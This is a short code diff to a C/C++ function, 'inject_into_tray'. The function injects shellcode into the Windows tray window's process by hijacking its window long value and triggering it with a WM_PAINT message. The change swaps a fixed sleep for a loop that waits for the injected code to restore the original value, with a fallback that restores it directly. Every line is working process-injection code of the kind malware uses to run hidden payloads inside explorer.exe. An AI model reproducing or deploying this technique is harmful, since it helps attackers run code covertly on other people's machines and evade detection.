@@ -212,11 +212,20 @@ bool inject_into_tray(LPBYTE shellcode, SIZE_T shellcodeSize)
     //send signal to execute the injected code
     SendNotifyMessage(hWnd, WM_PAINT, 0, 0);
 
-    //wait. injected code will be triggered on every message
-    Sleep(1000);
-
-    //restore the previous value:
-    SetWindowLong(hWnd, DWL_MSGRESULT, winLong);
+    //procedure will be triggered on every message
+    //in order to avoid repetitions, injected code should restore the previous value after the first exection
+    //here we are checking if it is done
+    size_t max_wait = 5;
+    while (GetWindowLong(hWnd, DWL_MSGRESULT) != winLong) {
+        //not restored, wait more
+        Sleep(100);
+        if ((max_wait--) == 0) {
+            //don't wait longer, restore by yourself
+            SetWindowLong(hWnd, DWL_MSGRESULT, winLong);
+            SendNotifyMessage(hWnd, WM_PAINT, 0, 0);
+        }
+    }    
+    CloseHandle(hProcess);
     return true;
 }
 
